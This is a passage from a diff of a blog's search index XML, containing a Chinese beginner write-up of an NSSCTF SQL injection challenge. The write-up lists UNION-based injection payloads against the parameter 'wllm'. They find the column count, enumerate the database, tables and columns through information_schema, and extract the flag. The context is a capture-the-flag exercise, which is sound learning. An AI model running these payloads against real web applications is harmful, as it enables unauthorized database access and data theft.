       <tag>脱壳</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Sql注入初识</title>
-    <link href="/2024/09/12/sql%E5%88%9D%E8%AF%95/"/>
-    <url>/2024/09/12/sql%E5%88%9D%E8%AF%95/</url>
-    
-    <content type="html"><![CDATA[<h1 id="Sql注入初识"><a href="#Sql注入初识" class="headerlink" title="Sql注入初识"></a>Sql注入初识</h1><p>&nbsp;&nbsp;我们首先了解sql注入就是在sql数据库语句执行的时候跳过正确的执行来进行我们的语句达到权限跳过直接进行命令的执行<br><img src="http://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png" srcset="/img/loading.gif" lazyload><br>以nssctf题为例<br>首先在了解了可以利用万能密码1’进行回显之后我们利用sql语句进行库的查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>确定几列之后便可以用语句查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200500.png" srcset="/img/loading.gif" lazyload><br>便可以了解第二列和第三列的类型<br>然后输入一下语句，查询数据库名称，以及库中有什么表，<br>并查询两张表中的字段，发现flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test_db&#x27;</span><span class="hljs-comment">--+</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200638.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/20240912200811.png" srcset="/img/loading.gif" lazyload><br>最后从表中查询flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200912.png" srcset="/img/loading.gif" lazyload></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>web</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>Sql</tag>
       
     </tags>
     
